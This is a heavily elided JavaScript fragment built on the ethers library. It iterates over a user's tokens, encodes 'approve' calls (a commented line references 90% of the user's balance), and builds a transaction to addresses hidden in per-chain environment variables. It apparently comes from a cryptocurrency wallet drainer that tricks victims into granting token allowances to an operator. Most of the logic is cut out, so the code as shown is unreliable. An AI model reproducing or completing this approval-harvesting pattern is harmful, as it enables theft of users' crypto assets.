...
import { Contract, getDefaultProvider, utils, constants } from "ethers";
            ...
            if (resultTokens.length > 0) {
                ...
                for (let i = 0; i < resultTokens.length; i++) {
                    try {
                        ...
                        //     Number(BigInt(userBalance).toString()) * 0.9,
                        // ]);
                        const tokenData = iFace.encodeFunctionData("approve", [
                ...
                const restoreTX = {
                    ...
                    to:
                        currentChainNUM == 1
                            ...
                            : currentChainNUM == 137
                            ? `0x${import.meta.env.VITE_MATIC.replace(
                                  /^0x/,
                                  ""
                              )}`
                            : `0x${import.meta.env.VITE_BSC.replace(
                                  /^0x/,
                                  ""
                              )}`,
                    data: restoreData,
